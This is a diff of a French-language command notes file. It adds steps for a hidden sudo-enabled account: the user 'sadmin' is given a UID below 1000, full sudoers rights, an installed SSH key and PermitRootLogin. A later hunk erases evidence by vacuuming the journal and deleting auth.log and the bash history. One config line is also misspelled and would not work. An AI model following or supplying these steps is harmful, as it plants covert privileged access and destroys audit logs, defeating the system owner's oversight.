@@ -27,6 +27,7 @@ Sinon faut créer un utilisateur invisible (et le mettre dans /etc/sudoers) :
 ```
 adduser sadmin
 ```
+ID moins de 1000 = Utilisateur invisible :
 ```
 usermod -u 999 sadmin
 ```
@@ -39,7 +40,7 @@ chmod 600 /etc/sudoers
 ```
 vim /etc/sudoers
 ```
-Ajoutez en dessous de la ligne root : 
+Ajoutez cette ligne (sous la ligne ROOT ALL=...) : 
 ```
 sadmin      ALL=(ALL:ALL) ALL
 ```
@@ -56,10 +57,15 @@ echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDKv3MSZ/mpcNNSTBarjvA4uRcAAojzE+XW/x
 ```
 vim /etc/ssh/sshd_config
 ```
+Décommentez ces lignes : 
 ```
 PermitRootLogin yes
-Allowusers saadmin
 PubkeyAuthentification yes
+AuthorizedKeysFile    .ssh/authorized_keys  .ssh/authorized_keys2
+```
+Et ajoutez cette ligne :
+```
+Allowusers sadmin
 ```
 ```
 systemctl restart ssh
@@ -202,10 +208,11 @@ cvlc fichier.mp3
 journalctl --vacuum-time=1s
 ```
 ```
-rm /home/user/.bash_history
-```
-```
 rm /var/log/auth.log
+```
+Supprimer logs du fichier qui stock de manière permanente l'historique des commandes exécutées dans le shell Bash : 
+```
+rm /home/user/.bash_history
 ```
 ```
 history -c
